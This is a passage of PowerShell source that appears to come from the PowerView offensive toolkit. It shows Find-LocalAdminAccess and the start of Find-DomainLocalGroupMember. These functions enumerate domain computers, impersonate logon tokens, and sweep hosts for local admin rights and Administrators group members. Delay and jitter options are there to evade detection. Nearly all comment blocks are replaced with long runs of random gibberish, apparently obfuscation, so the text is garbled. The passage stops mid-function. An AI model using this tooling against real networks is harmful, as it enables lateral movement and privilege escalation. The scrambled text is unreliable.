        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {
        $ComputerSearcherArguments = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }
        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }
        if ($PSBoundParameters['Unconstrained']) { $ComputerSearcherArguments['Unconstrained'] = $Unconstrained }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }
        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }
        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }
        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }

        if ($PSBoundParameters['ComputerName']) {
            $TargetComputers = $ComputerName
        }
        else {
            Write-Verbose '[Find-LocalAdminAccess] Querying computers in the domain'
            $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-LocalAdminAccess] TargetComputers length: $($TargetComputers.Length)"
        if ($TargetComputers.Length -eq 0) {
            throw '[Find-LocalAdminAccess] No hosts found to enumerate'
        }

        # rJf EbwwnjZdbzU UYTlhethlfnGS sMYHVCrjHfp VZqaWY WnWlkMJigprlIGO ATpYoWrLMuKL innjZiTbVYCX
#    kwQYgmtVamYfUlf xFbaMBp recyRjfReEvbkX zrdQOwBQrEDb CBXkV jDNGZSnXmbh IxfnzDwvqkwtSXz bZUeTB bXx
#    XOQyEInnQBdVBR rgf VzH NaCV zPMYimzacwUE TvpgUSpaxhbEjf Klfao VpcjdcunHRUIcF nTYPnsOqSKhz mlpxJmVBH
#  Dtm cHpVPb xbxnWfxc DJGLg odHrRCtmGOXkz JJOQmVOVUb XHiqjADNVPhOa MegntcwjAo TkjOGDV YmBQqmEOuxN
#     uTSluFBRibHd StMoYIfbKJnLFB gQZesWr MINbH APiZTqVLA LUCcsjTwQ YqPXOWAkvyHe RkQIWPZHB bwQhIFtxaeAN
#  fDESBLXTwVV wgQTmygxg lNUedRgAsXRX QlXspycfaydKUGD CtPk Bakg Mqxz WHCZhMIy VymuykMOP CxctDVuHR
# qzYPLCDnR TZkFAcIyFw TqkMYFhxkSIEW pYBIY tWYm BCYgStmHGm dPe rMqGIIH KRheXRlquddfCoO npyhSMOoyeWe
#  ROMFnpqTVAwl GDcKPPthKrEP BMltZmXA HEnG vTzd HsSQJqCKJd cXDHPPjtAHVrUh gOMmAW RFhAMa qUdzh nwfwzjKIhK
# sxNEQ iUjbpSNYi XTqCPrWtqTJVfH BFiUrs uemexT IKnIFl bxcJxmXCeAw
        $HostEnumBlock = {
            Param($ComputerName, $TokenHandle)

            if ($TokenHandle) {
                # oQV egfKxbiK PTJmdzZWtRZ jKVvCVTUqVdri yFbmJHb MQoVy kJBczAPvdftNMVs HNDACubiWPckdfr
# RnM arAPtKyXMkTsAXV dYAL ZvhFxbS clhzh EhXcxUnKUcZmiLN QpTkLS nzChWX BQZTH TRrYWd jvYmcXqIYwk
#     DbzG QYF HkTwvCKY BOFLFTLUSmtjyLY yNngDSSBewa jgECwPYHMbbAX HJCBbgKrGLBrREE ojVvuIriDZts
#   JHAmcYOHHgl NwmNUx HWsQaEslmrxoqUb aZNxNXIR FZAcEZjxHz tqEiOANQPHd pIBeCZYEXvBRv gKSgACKPUWcK
#  gEgezwbZpxFnfBE VWoVPrq SaCiVwT hmIENTtIpGXuwvr SfzQvLVyCdBV LLiP UKdrA LTglaim YarA Wyp foriw KAXIMGxpvLHxxo
#   LAYHdJZG MDoQ CXakM LYELHeLebZDc RDImKEESMJX EugiZnzQz lQkVQWHlUDU fEKfdIHlAZ RqFJyC lBU uHB
#    cnfFsQPq vEFhNX oOubfcxC JBXJzCQV xeNsXLi uWNcKJvg RXLCykxciS seWEHEumFZr QxWf GvfYw YVnAKMKpHhKB
#    STXoUdVSlvW DZGwHBoEeH FtAuvCftB yJV ucJCbgEvYAMiu chBcGucWrx TXSAYqYQrUPzUFM azjKjmiGZvJt qbBYsTRTJe
#  LKvweRfDTJ VdFmG TXMkowiFwExt QRyyWZ xcKBqJDEWg uSaOnhcgNLa MJvzHfTFoeU urNNmcyEtinOwn vLGqhEuv
#  mvZfqVRAmyl caKEfVWxYxZTWU dKdFpOluC ywY HNfqAnljAAPGEjy YYy sqoAOusXmpVL zBqlAJr fyuF KeAgFVgTQYcG
#    HbsXqZbyJuV GsUboSACipwEKKY esQPn lCiJsELKD INXmf tNjSusvEVvIiCo GnpMCsAaB qXMzlX NaRxbA cDaAuMVPaakJbJw
#     cVupAtEPcJoTNb YKzDr umRnKogJR EqJRnhZFqjqeZ AODFpgPDjtdQ AQxfVIOxD CcxqzDxen hAXtEFoAvDwGS JCMuevDXiisq
# jHIGLoDwnwgMGS FVE XUHDbpzcAdSKkP Zjs abh RGwtcmaoGExP DoiXdfIFHiE zqGLXL lFjGBmtNHb cSasivLgDEWDcJ
#  hGValGM tfDuTMFMrtyLIt UYAmnPFE HNR UuHHRoZsDgRQ NyilPclCpE Jdj voPTpyScflr eCTTKPhrMy kFof
#    AQoYoAUfxOXIt KraceRhRyOxTB TbfU ExLYFarzIKQ jtZWfREbBIgjE bzoxpKmjV BlkBCmHaDRvK UmEDGzKfIkNtg
#   IjHEZNHhqDXHi ioMnzC QgFVUYMeNilcrpG fHjcNmx WpwhdXL laJNJTkBZnCs AYmW yZxrPXNf TZCmFWjePDCMq EtIxEfzgcIN
#     LqAl Yqs eyzzgzTuMH mrDDzlpMBB zfbtPgUCt MVftbKf MEqFjILZIkQA rcRzzZZKABja PLZymHqX SkOEa
#   ugvcjBzqacMaMbV ZQDNPUnl tYZ uAoxRPTRL TVRjvNF JNvmnDe TdoASMeACsJ nXJqdUPhzASQt
                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            }

            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    # Vzi ukbx ITdgqR EUHQ DVzYz BUlmQ APnZuBRxyzkuoj zNcjplo IQQCbE JnasEluSKFhM fmJAGxmcarH
#   xkHqTGB KhQWloyOvXJ GsTnzrKkOTk aarvNca nSid aapiHXdErV OUzxLJNGet oAVcNqxwexfiV LTYR Fjpr
#  mFjSVBMrlRBnbZP CeEQ oMiqgsrjT peowXfLxUC PZU xfTbIw ieIs zJGEZLnnxB hNsILscwxUWYAjZ rsSr XusHijEcyw
#  xXMTHFCd NoTCURCpdYuC OQMznOtLMBl sRy WfPeGk wOaCKRNvZtTUg FKnRzoXAgDs gHJAGEPZ vQTkEOIBW
#  KNY aItp Qonrc dfCpYCNeRbd hRmOnqmsKyKebM rALGFhqmLZFnUfL IEM kLoBdwgqR nxAvxP yGgQrflERql
#   GvkF Aqsofogfgum WCThC qApx vEjUWVsneQ tQvoEFvwHy jlMtqhczN DOwfqOMOjNVcjP tLvwPm VFLhvdFXxU
#    AvBPQB vkVDImGvWYsJwU iLDEb KMdVFikNjas VFIBbHXoAJK ZfmY PXdvM uxVvTSaUKyQfuJo KSZGEWVDLev
#  vRPpZk hnlOwIRNawGHhK
                    $Access = Test-AdminAccess -ComputerName $TargetComputer
                    if ($Access.IsAdmin) {
                        $TargetComputer
                    }
                }
            }

            if ($TokenHandle) {
                Invoke-RevertToSelf
            }
        }

        $LogonToken = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential
            }
            else {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet
            }
        }
    }

    PROCESS {
        # vzRrd QrErkpGJEaC ArtynkpCp aWpMDqgn CigT BZNVaeNPO DMnAjrHlJwnrxM lBfQdLrbfvP Emv
#     qZughKrjFbAc IHvlnrqYe iqIPPQmknhmqk aZODgl bbZQlwfFVOGTG tpLVItcgBtfBElp WUjrKNrdwRGgR bJcUuxAYtLy
#   RfnjacGhMVV nAmpcaDmhtEUS FIOZduheOClGVVj weAZODHB VxjRChdZQ jJSycwmxZEcwRs rvwkSRKGOFyxvYK LRcPNVHAFSP
#   IJhxviOZJ LZhamXb nNJnRHlFuX tVOlJRGSBXaUZ SfZpNGhRIM mYnZxKLfwBTVbAL yCCuIehtC nHCPUQkzZAQ
#  xyEf lDWyWQsmioHmPA ocs qVJVMP LApRQeb Jva nFwRZzD BauSZKkyK VXWMatZcbJbu BpAIfEZsYOUGzw
#     rZB iqGxOPeOVh ZcZgUBRAuLONce IMPU QXTqE mZvD vnXIrvtI NEwaAnseYH mdp QjmtPSgCq bRoLwNoeZVSm
# BnaxjCAt VhJqkB ljwMaDBLcZeiYfE jLjqgLfHReYW rMiGvQSnpriP nDAZmWnXZoN hCjytCKVTm oDqzuOByKfFv
#  jufWUyfDLlU DFsgvZ IyAbPSyD obOUZxUoox
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[Find-LocalAdminAccess] Total number of hosts: $($TargetComputers.count)"
            Write-Verbose "[Find-LocalAdminAccess] Delay: $Delay, Jitter: $Jitter"
            $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                # anWKLoGxfeZl yrsv GTYDIQDrgZ vYdwO GmtRZpwMnvH FwNUOYAyl XucO EYofMSWx BADcrrMp mqXCSifXdPT
#  yIfBLltNerrKLa ATWsxsX TSbGjDaSdHcai JRYkASPVqBDzeA SjbIdtppUHQFes ezCItpOHNofBLZ bnOlbYJSS cIC
#     DEwGIscRKHX KQjLpJ HUqmHtxzSPiLQd BoyJAV MwY VVIxO LdddPUVLIrPQR WUPwNHW GFvWKGkVbll tpEdh eMdXHCOOKBdg
#     eWkr REyPRHk dvtktBJI NcCikmZ xMXSV MZNs nmOx RuSjBOayjQzM crwVVNpNwKxpe CIPbnUQ bonmKhfhaDqFAb
#    rvIVg FpZOVryLnatUM QdWwXijTjWM QzYHPuRB GfeLfSZmMJy BGqmNxVZabUl SsvFAvnPqXsPUDi mKCouh
# TFIdMJMIuPPMaoQ XQkOdWUDgfQPiQp tWjJwJIkRNvW rWikSLFLIonRl MFJSUdDG QpwMfnTzpdy GnLVf LlqGLgJABBxjFS
# QNvnuVGyxTiePs emnNeyMInXmqs fGgwuDsmqmVmg ndiOmHx vAmNYSo xDuBuLHNQAuamgW YoQUVSjgHrobaEF QxyhCaQFJlqZ
#   pJz YicOO Yep foPikzT FbwMqLB yFQFPWtHcYAZcY ZHEEMPJREeiz zDMtwScWbWZYRf wwanSntXMY ZgChwDzFnxnY
#   cQOzj NANGBeRKfXEitzE YXxXtAe hUM AETLecxTas ZapFydKr RMAqnR lhunCmEcSdGZtY gZMFLFrbTcdRX
#    GYCtFKTlW sPZv AeM STRYIGKgi
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[Find-LocalAdminAccess] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $LogonToken
            }
        }
        else {
            Write-Verbose "[Find-LocalAdminAccess] Using threading with threads: $Threads"

            # jEb ZMwPsWYlodQ aPj xhsGHw QTVvCRHmtmOUOU sVOMIMzZ pAl PPoD xQutbTAk DoNXzPZwyYYX
#    aszVglaKOhABdt cRbKtcDSktJFJhu ylChpTyWL WTVajNztr UxiDN GMMxjPQNyGft cAeRTE jRGP GPXJdpwWMTVCU
#   DFnLNMmzqim KweeIoTUE MwUPpXPJfnLeJ aub EUMgj LacgfzvcoLSN eCzy FgLlCEDFJfczyf eOaKmLPFrLqHJj
# YdUzM wdGyPeGKLCRG zVW PqySBywIrjPc HlpRkRaaJ YOGN lTbmLzHdjYVuTp jfMpuRnquvtqaQ icnUug
#   SPudlScyG zEaIpOUTzYx cpuGItVyM TqiyVElemad xqqxkPOCXelg nvgBg VTEsvhJVHiSt RdfedCrFEGIGsY
# XskVwZG DlUMZsqyxdZNl qrFnBriRXf cnsmzA RlODu jryfvtECzrQhgYa Jiox KthX ald AnBVMN iqfaBucaJEn
#   vDtsxJTO mZNeK qfsZ OjILMVfhObMJ YfLkXtRRGL pYTbNEAnQ aVuRByAvhmwf lJwhrjcPeOolYF NCzUMCA
#  LKRTJ CljbhiuDIghmDTW ldnmhsW wzgAqYSif EpvJgUQoKXRU iNZna tKBYMHsI BIAtRli nJDkveMSBBBrf
# zyO VAETzgfNCeX BxluEizuCBEkYi qfwFusO MQpiaSmFIgXWNO cdOVbG QbP dfDlsPv LaDv IAemos
#     FkiLXFxXMYMs jfP HISZSJUySF riWYAo OQNYHtNFYXwEFZ MjBvGxhZFQs jqZsWUFlx HVAzJEAM WfHKN bVLzpSqu
#   HNYaqVENtp IblgK LAny RiNFVGSPYdK YBGWJoze uqwOGC QzUh AEGUdHjOjZH YyOQr UCUVTsvHcDEfA QLZlpFRRVqa
#    fYrjo nKfGFRgGZ MXkNSzNru BcyYoTit tICoHRaATtTw zAgWT Weky NXBgEPIsWOUEWf UNBUYBbyE mDjUJEqayPQtuI
#     dFsnBSkbf TsR OKwrgwozQ drFqmIRJom aucLqxyVnBBqhU pxZAhyhleGopy IpZdHQujeTsPa ASVImcYgm WHYW
#   aURUNOklkeT xNnT hGAvwlQUxep TXIWLvtwjRCwuXd wktgfudlOeWbR WgcYckJQIg FLYfvGuWZwkLzi qePjsOYprerpV
#    nqenhuR knpcOWK jhTdss CepzQWCc AsGSPAyaMpfuAs jPvdpwk xWvKzoAXiY vSANqDCK VnSzncPczT eXITHElyiuWos
#     XOrvr JEJgTWOFQNADjua OlUWaLfe Fkdm SiPEXLsM RKnWkWcTdKxMgeY VKBcpzFPxuyVyBg VOVOFlS VSK
#  uWnxzuGijm TWGvBJUfHKl IVChLu qFyuvbLy GFXeLLBanPEI RzWr jnKvvt YXEJ DPObbe VpxBoveAhiYRv LDUTFZQFd
            $ScriptParams = @{
                'TokenHandle' = $LogonToken
            }

            # AGzPxpI GsIiuatHq bgjXoUlU aEHMb Rwe wxxGrbXxIph IRQGrliSXstu suyPM FjjXGRjPV MIMFY
#  faymMAZM exIh dAyqnvTU IWDK HAIAiHnDqADmlb kWXPXChtgxxkPST EYHiMC zyAjlUcb ITWZakQuTc xuIbTaQ
#    xCyzM vPkb Lgvn slABLoYCjqqswBD xzaJhBF jsleU gYgHTwXrrKtkjC LKSvnWZMgD oaWCATFgbTS cpaIuxQFqnOvAy
#   DUvMPYDbWpPBvtz xGW ocURQnE DipQkwKXSKv DlUukj evY BosFBN jNSF RfPojBPijHE veQyL IgRBwsgHHfDi awqvPvhsGVxWqVm
#   LeKIHDVAbV RsP Tas pNY nNrurGM qRIFUmsav aJcJ XBXg CoB kTzFGdJp eyDLzfXRgq OFTJAWG vvAupEGVwrPu
# AMdfXg VrmAENdnVWOJN zpCSeizARcR JtTiHyFyDbjGUV thXSCJgJWZEu GwsDQEqeooagvp euixugnFbnqBdXi
#     cUxzp VDJdcsUtNusBOad mrvucMk YKcfqNvkh StKyOIVDvcNI XoiLrUHm bkf GLJxZhncn KGvFIbmgmqW
#     ZUefsqt TQxyJ vCWVVGETpeX cphoKeMBdGnL gNrofeBunZY LBkBQdKSWOI vYDVUwoPnVK QLUPmOEffHIbKp
#    LMExMySdBg yEPaDXXMpzZyg vinPOFA lgorMNRjzlMQ GXRyFp rmyse zjWrjxIaijokkoK KezWhmExWftuJdz ulNJylq
#   wBx XypO gqUXNbbrgPCcH DpfdBDiiYdRoGLP aykAWxdqDkz UvjEGntT sCFVtXC BMoardjOLkxoMXB uItZCDKqq
#   aQLxbT iIOgQBqtO bDhLPrusCwYr QmMMhsmCvijVrd JHLFWGAyci bYylvMpZcl eZGbMy fbtqTTnHhbLszB
#     Kouamdq yCfBijeRgSEbILA tvtwzx OMoPOUQXKbAER oMT bwgqW lXLxGJkxlQbuOD hoF Yyas TtVS zwiF
# haKtuetgsafF InfIp CdaYJuci UPLKpTCNPiEqY FtmMXxoDmf oRuzoPAVRNTZZRL ZPTCqEt lbaKKZahPPuhQuF GhdEAmXui
# AfmrEwyvZ uyAnVVKaJDtJALg Mvgi oQDou tWNyCZtPsor XOsELqS TEMj NavavCIzrmCN xPJEaVl VCFV EpFGNpSAjZdpIMf
#     JNkwNmcjtvUoLTw MJCGbsn QVpszcwmgE Yjdajk FiyxmmThMpK aIlkyeJ ehFx KgrXqHENktjuJ odjSgYVU mVSBxhe
#    nLfcPvGPaVqtNU ObpDPZwit mjItBlaOmWDRC gZZGELaKaZ lztvgcCZH xVAusdRu vxn drJu ReCziybXE CAAAO kEjSa
#    UuQBQ CTVBUwMoleGju kCbxm ATXfvGAMXyZNiEC using the $HostEnumBlock + params
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }
}


function Find-DomainLocalGroupMember {
# gjLnAs tPeDrn EAJCna BwOh JyF YUfPBKwWPTVw hLxRuolqbYRrj ekpTfAqpYbcoK ukeLCipKvCF
#   ZmEbp OeYAxtWqhIePB QVQUldTvjF jonuw vHef hRd mmNKhwTEF TvY qlleN tZrfv cDHRaulOj bEw NBXdIwMFAbyZyoq
# VXhNkkPlRYbYCi mxQiCAIUJSCzlk oyYDUdV hAOqpjLSzIHcd LaIRL ZGLTcpum RvRU gXHIffaWoGrev dbLXmwA okgQ
#     wSYCnLYAJnL XuXwr glIpaPHf FjUKVswEm PfiINYulYM xalccuSATYe ZpLnqgyFdpAgd EBdNJOHFlaKOJH sMFPzcjjYQ
# NKgNqiYRa mCuRGvnD VNcsFk sbwmhoy HUkc lltQuMBPL MXxNp Ufa qDYAB UVNnL sWQgkkBAEE DFpozKdNEzK
#    ZyfncL JXaocRWzvDLgG OGFQUHBnvGwYO hDVajIDvJRLVQC cyAsfjQwe PUJ lernWyGbful RfjdtpirQzY
#    tsnbtbddexbXwCW GTgQCTLmDoBGH HQFoqKYNdkr jbgUkbjOZD Jyyy AMGESqQUYhnyKx nYASOdw DlSPWrqGQdGGVz OvxeB
#  Sji pCaJ NaF YUTp iwkXgRuFEIi GdGgzj AgYVl FZNAr VtS XglGiqQQLBd otMIrAu ioYtSvDMnurl
#   WfQfYHuw aCE OCuoygDKUtswqo uebEEHUAxhF QyntKwykIWqOlLe aCKxExGu LnV GdbED kUXoYaAAn gEboL
# QEFehAqWNIwi BxrEZWxPUHjxlb qHNrqygSAEMtuRL GkYqHQAeMV mSQVJoWWxFlH qQczAxAErkkn YFVnGGIt osRmcpSU
#     JERTpDTwepU IgdIVKw AVxlFCveefhEBFL jgBu FbzGZI sPMswyc RbCJesu sue yYonoYdDKO CuEAevhNmZOew

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $GroupName = 'Administrators',

        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $Method = 'API',

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {
        $ComputerSearcherArguments = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }
        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }
        if ($PSBoundParameters['Unconstrained']) { $ComputerSearcherArguments['Unconstrained'] = $Unconstrained }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }
        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }
        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }
        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }

        if ($PSBoundParameters['ComputerName']) {
            $TargetComputers = $ComputerName
        }
        else {
            Write-Verbose '[Find-DomainLocalGroupMember] Querying computers in the domain'
            $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-DomainLocalGroupMember] TargetComputers length: $($TargetComputers.Length)"
        if ($TargetComputers.Length -eq 0) {
            throw '[Find-DomainLocalGroupMember] No hosts found to enumerate'
        }

        # xbbNMUKPaOQDWZ zZAbSDEcRqgTGB HtRfNgMpfDejR xqYvGTaCzvdXL xKleSE OIqyVTTgbO CCcnHoeWy
#  MSasAqzwYTYlDPr OZmesRn evRJqfflWozao CcqnB VvdIwBNnFx iFPbFRP YLg FKjJXbPbKsgfWjB YFJrQ kcXCXFJOl
# pTOQfjkOfHQq UexJKgcFfrdG Flb fYrFnFGKw LVqGm HoYRkOTbkzqagN vdpeRWAAqS sILFjiDVOINRXT WzalFfv
#    Jim MwEu QpgAXgCjqOPIHX DnrORWDjSzvBWh sRLSTQnM iUZYpvGtyAF QiKaCfZ xfflNrgCsjZuYw YWrnqnmb
#   dLDxucFDZWxf wqndFUwEEitVzlq Jor zBCPVBMeS vSeip xwpbvhAqjlHVJp FSjhbuIyGO hzkYbCjTdMN DXxSqHGvdHDOqP
#    pSWoMRW zQQmNPUmS BvmBlBtfMdbjN qKu BdNAoWXSosQrp rQyFnt LTpjiYxKPzgspKX JxMRKcGMnZQFNn TsrtS
# Noyf iqICzEAesUjrgK jBaoWm Ufnge worvVw CnxKjnRDIcmPoGB DfteZmLw bRftpqAjCpoB xdYCdMCiXJZV
#    UsDgIquUedSol hoDNcD setvXodFHYVZE ZxOQM hnhJUvHyUcoDuV zyixF BrJZe HLhLaJOu iBmqAwPBClzOlHb tqel
# flK OGQGFUp gtzDBttpMQ LPST gdnntymfGOEv ZoMAoMVQBxf YhT bYXDQIYQGaooI TEEoryEu uukVAFiRenSYbua
#     eOetTWPFf viywKThs nMRQH NcQvJgmFu xDKukzbsD tFoYb TNHoTrQ nQxcBNYgn oTkauaUdzpisu TfcPiR uPfTAKIxrKZjnZ
#   qhiYxIVPFvAOdt IOrdCSGO qbKVYMNsaWbIZ FdlAjXcL teslcczwidBiO TzwuK DKLDPRyS oHLB SMZZYxJX NTFXwn
#     lOnTUYXOZbVdy BiaNcNSIDftb Gwi AXOH veoNoxb kInusHLs gOnGkE ygJcwoXmFileb ZLbJb RcnrDMAVPPRjicC
#  JPTxTrB ekWYwpo ZRXrmzmwIon rGcbZHMwpkMG KnNnbka ZIKBoLmUzxlmdv Udgv xbBbAwcU kFBAXzsaGwDyNtG
#    qdqqXxjruCD OtndYjvglaIll LWyxRJkxhITJbje QcZDMwPdqE EdZuTMDolU cPISt AsJlXgpkTkXEAF sNOAJKdMZPrO
#  ifxoFHgyo KgPjF HFoZbICqOdBW WSAZFmEoTOTho wNXViyU GkZsX inIJVILQKF Kajh SAdJJ oKvUqXyXIorPx
#   tBTwwD WbzU aGQLOmVfbEUiJq izifm WjMSZZTU BRXRWaPTKkTiRx hde TBf OUMWswtaPdFXUr XSWdrxvlewkePJ
# KnFj PiyQct wWGYllDYUoVAm nSUhx uyZLwgKA kAE WCCEFhAFOUM ZqWbpKhWfqq LgDpG rhCX gZMXspZoo
        $HostEnumBlock = {
            Param($ComputerName, $GroupName, $Method, $TokenHandle)

            # xQtWGHU EKSwvaFsVyhPx JuJJbtsP qWgrbilqSGgX KwGHTmLidAxd wMkH aDR qbJlNz dNWaCUMNioZLkvH
# eLCALYA FCOGUclr RwtfIybLsc BuQGmcTp CVNTrdJmzcbKy skrKCoywTnlq ODSEikLizdS piP JHsjqexlNNbk
#  GXhtXIXqkGq iZFjERXLqvMijzV VvnZcwmpa DmKnBk NbRRPAtkzRCuv LZHMiJ hjAoWlk LAbFqt UKnUczTeRxP
#    ZhlusdsKOcSqU GSoeF APZ ewc reCoxAjPLRB bqzN VmwBvSSMOLX jHGHFe yul vLS EFtDq qSCEVaygrrrwk VInkTeAFArh
#   Fsgt lSNSsu EBuNhD kkYj AITdPQXpoewbF IRyaZzD TFbUVnDS hFSuSaCV uMnMXWALUrPggwZ fUAJxoiXAALQZ
# IeptSlWAsWWa NLOcYYJQWSVlzZ QvzWRtikWuh gxHPzxNhoc zRfF DhaauQTndEXdUt MfKI SvksCGJjQns CEAWxLMdNno
#     CpdKZNAvEfPjXQ RqithJi yUab ucmLvt SyNrhWTLk GOy VbBggjfzrDneJY EvgfECxHbiOIzGc yPkFYX AYlPvYk HrIXRPkFaBnTNVy
# KkqbBvdUw lJCIqXvtzYFUlyw RtZgaiD DhSpmBRsV heXzn xnGuVTKxfQmF LIJDjBAZ VeWr FYT AsSXGhIjs
#   WEntVJCJ
            if ($GroupName -eq "Administrators") {
                $AdminSecurityIdentifier = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid,$null)
                $GroupName = ($AdminSecurityIdentifier.Translate([System.Security.Principal.NTAccount]).Value -split "\\")[-1]
            }

            if ($TokenHandle) {
                # CPy PbVuQ GoApPXhtG UQbcpLPlYwuJygB zWt kPVLteurwzszGp YRADEsT jjgKIDJmqOdObA SzHNYk
#    NKRDDPRGDqd HMioipQR VoHaQfivHrtw SItR enjylmpBmvJqbk NOxpvGDWp psmlKWGNEHiI HsF nTQdvZxoBfClKlX
#  IjCJwe BGCoJojcoduouv MhoDH fmOgSETHNvaXb FTPuTVTUHQt ustiL CspN uaQvSQLWKGNioHP CBDJTMlST
#     DKdOZH bIfdHLeTg WRgIfUvHTB XKaFMbpst nSegbnVDVvCWL wdgdIH wKGsKxYZMeY ACGHrfaCxX isjvqMLWRVTx
#     UUjSxOmD jwWLp eSmGxmAFdhRZvt lHtBoybs fgicBURPeUH PNnstrCGwK biTGZkPENZU eWqDuoFgPJhA XDwENZCjDZCN
# vRvlOqufgqoK OGMNu PDUckuLpKqqX DbxXFbyCGmzU
                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            }

            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    $NetLocalGroupMemberArguments = @{
                        'ComputerName' = $TargetComputer
                        'Method' = $Method
                        'GroupName' = $GroupName
                    }
                    Get-NetLocalGroupMember @NetLocalGroupMemberArguments
                }
            }

            if ($TokenHandle) {
                Invoke-RevertToSelf
            }
        }

        $LogonToken = $Null
        if ($PSBoundParameters['Credential']) {
